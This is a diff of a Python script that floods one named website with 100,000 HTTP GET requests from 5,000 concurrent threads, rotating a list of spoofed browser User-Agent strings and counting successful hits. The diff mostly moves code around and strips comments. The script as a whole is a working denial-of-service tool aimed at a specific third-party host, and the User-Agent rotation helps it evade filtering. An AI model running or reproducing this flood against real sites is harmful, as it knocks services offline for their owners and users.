@@ -7,12 +7,8 @@ import threading
 success_counter = 0
 counter_lock = threading.Lock()
 
-# Function to send HTTP request with a random User-Agent
-def send_request(url):
-    global success_counter
-    
-    try:
-       user_agents = [
+# User-Agent list
+user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
@@ -35,21 +31,19 @@ def send_request(url):
     "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
 ]
 
-        # Choose a random User-Agent from the list
+# Function to send HTTP request with a random User-Agent
+def send_request(url):
+    global success_counter
+    
+    try:
         user_agent = random.choice(user_agents)
-        
-        # Set the User-Agent header
         headers = {"User-Agent": user_agent}
-        
-        # Send GET request with the specified User-Agent
         response = requests.get(url, headers=headers)
         
-        # Check if the request was successful (status code 200)
         if response.status_code == 200:
             with counter_lock:
                 success_counter += 1
             print(f"{success_counter} Request to {url} with User-Agent {user_agent} successful")
-            # Process response data if needed
         else:
             print(f"Request to {url} with User-Agent {user_agent} failed with status code: {response.status_code}")
             
@@ -57,25 +51,21 @@ def send_request(url):
         print(f"An error occurred while sending request to {url}: {e}")
     except ConnectionResetError as cre:
         print(f"Connection Reset Error occurred while sending request to {url}: {cre}")
+    except KeyboardInterrupt:
+        print("Program terminated by user.")
+        exit()
 
 def main():
-    # Define the URL
     url = 'https://sanokam.com'
-    
-    # Number of times to send the request
     num_requests = 100000
-    
-    # Maximum number of workers
     max_workers = 5000
     
-    # Create a ThreadPoolExecutor
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        # Submit requests
         for _ in range(num_requests):
             executor.submit(send_request, url)
     
-    # Print the total number of successful requests
     print(f"Total successful requests: {success_counter}")
 
 if __name__ == "__main__":
     main()
+
